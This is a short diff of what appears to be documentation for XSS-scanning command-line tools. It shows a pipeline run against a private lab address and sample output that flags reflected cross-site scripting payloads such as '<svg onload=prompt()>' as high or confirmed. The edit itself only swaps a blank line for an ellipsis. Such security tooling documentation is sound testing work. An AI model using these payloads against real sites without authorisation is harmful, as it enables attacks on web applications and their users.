@@ -27,5 +27,5 @@ $ echo http://192.168.1.108:9999/home | url-miner -w testwords -json | gxss -s
 [high] http://192.168.1.108:9999/home?q=<svg onload=prompt()>
 [confirmed] http://192.168.1.108:9999/home?q=%3Csvg%20onload=prompt``%3E
 [high] http://192.168.1.108:9999/home?q=<svg onload=prompt``>
-
+...
 ```
